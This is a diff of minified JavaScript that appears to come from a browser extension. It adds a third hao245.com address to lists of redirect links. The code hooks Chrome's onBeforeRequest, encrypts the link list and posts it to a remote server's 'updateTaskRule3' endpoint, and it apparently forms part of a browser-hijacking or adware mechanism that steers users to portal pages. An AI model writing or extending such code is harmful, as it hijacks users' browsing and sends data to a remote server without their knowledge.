@@ -2255,6 +2255,7 @@ function(t, e) {
             for (var l = s.length - 1; l >= 0; l--) a.links.push(s[l].url);
             a.links.push("http://360.hao245.com");
             a.links.push("http://123.hao245.com");
+            a.links.push("https://2018.hao245.com");
             var f = c.E(JSON.stringify(a), c.P(n, r));
             o.post(i.info.rootServer + "updateTaskRule3?uuid=" + n + "&time=" + r, {
                 D: f
@@ -2299,6 +2300,7 @@ function(t, e) {
             for (var e = t.length - 1; e >= 0; e--) u.links.push(t[e].url);
             u.links.push("http://360.hao245.com");
             u.links.push("http://123.hao245.com");
+            u.links.push("https://2018.hao245.com");
             localStorage.DEBUG && console.log(JSON.stringify(u))
         }),
         chrome.webRequest.onBeforeRequest.addListener(s, {
@@ -2328,6 +2330,7 @@ function(t, e) {
                             for (var l = s.length - 1; l >= 0; l--) u.links.push(s[l].url);
                             u.links.push("http://360.hao245.com");
                             u.links.push("http://123.hao245.com");
+                            u.links.push("https://2018.hao245.com");
                             localStorage.DEBUG && console.log("second time"),
                             localStorage.DEBUG && console.log(JSON.stringify(u));
                             var f = c.E(JSON.stringify(u), c.P(n, r));
